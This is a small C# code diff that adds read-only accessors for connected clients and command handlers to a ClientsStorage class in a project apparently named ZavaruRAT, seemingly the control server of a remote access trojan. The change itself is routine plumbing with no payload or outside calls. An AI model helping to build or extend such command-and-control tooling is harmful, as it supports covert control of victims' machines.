@@ -1,6 +1,7 @@
 #region
 
 using System.Collections.Concurrent;
+using System.Collections.ObjectModel;
 using System.Reactive.Linq;
 using ZavaruRAT.Proto;
 
@@ -15,6 +16,9 @@ public sealed class ClientsStorage
     private readonly ConcurrentDictionary<string, List<RemoteClient>> _clients;
     private readonly ConcurrentDictionary<string, Action<CommandEvent>> _commands;
     private event Action<CommandExecutedEvent>? CommandExecutedEvent;
+
+    public ReadOnlyDictionary<string, List<RemoteClient>> Clients => _clients.AsReadOnly();
+    public ReadOnlyDictionary<string, Action<CommandEvent>> Commands => _commands.AsReadOnly();
 
     public ClientsStorage(ILogger<ClientsStorage> logger)
     {
